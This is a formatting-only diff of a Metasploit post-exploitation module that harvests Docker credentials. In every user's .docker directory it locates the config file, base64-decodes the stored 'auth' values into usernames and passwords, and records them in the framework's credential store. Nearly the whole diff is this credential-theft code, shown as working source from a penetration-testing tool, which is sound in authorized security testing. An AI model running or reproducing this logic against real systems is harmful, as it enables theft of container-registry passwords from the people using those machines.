@@ -9,26 +9,29 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Unix
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'           => 'Multi Gather Docker Credentials Collection',
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather Docker Credentials Collection',
+        'Description' => %q{
           This module will collect the contents of all users' .docker directories on the targeted
           machine. If the user has already push to docker hub, chances are that the password was
           saved in base64 (default behavior).
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => ['Flibustier'],
-      'Platform'       => %w{ bsd linux osx unix },
-      'SessionTypes'   => ['shell']
-    ))
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Flibustier'],
+        'Platform' => %w{bsd linux osx unix},
+        'SessionTypes' => ['shell']
+      )
+    )
   end
 
   # This module is largely based on gpg_creds.rb.
 
   def run
     print_status("Finding .docker directories")
-    paths = enum_user_directories.map {|d| d + "/.docker"}
+    paths = enum_user_directories.map { |d| d + "/.docker" }
     # Array#select! is only in 1.9
     paths = paths.select { |d| directory?(d) }
 
@@ -60,7 +63,7 @@ class MetasploitModule < Msf::Post
     if parsed["auths"]
       parsed["auths"].each do |key, value|
         vprint_status("key: #{key}")
-        value.each do |k,v|
+        value.each do |k, v|
           if k == "auth"
             plain = Rex::Text.decode_base64(v)
             if plain.include? ":"
@@ -69,19 +72,19 @@ class MetasploitModule < Msf::Post
               username, password = plain.split(':')
               credential_data = {
                 origin_type: :import,
-              module_fullname: self.fullname,
-              filename: target,
-              workspace_id: myworkspace_id,
-              service_name: 'docker',
-              realm_value: key,
-              realm_key: Metasploit::Model::Realm::Key::WILDCARD,
-              private_type: :password,
-              private_data: password,
-              username: username
-            }
-            create_credential(credential_data)
+                module_fullname: self.fullname,
+                filename: target,
+                workspace_id: myworkspace_id,
+                service_name: 'docker',
+                realm_value: key,
+                realm_key: Metasploit::Model::Realm::Key::WILDCARD,
+                private_type: :password,
+                private_data: password,
+                username: username
+              }
+              create_credential(credential_data)
 
-            print_good("Saved credentials")
+              print_good("Saved credentials")
             end
           end
         end
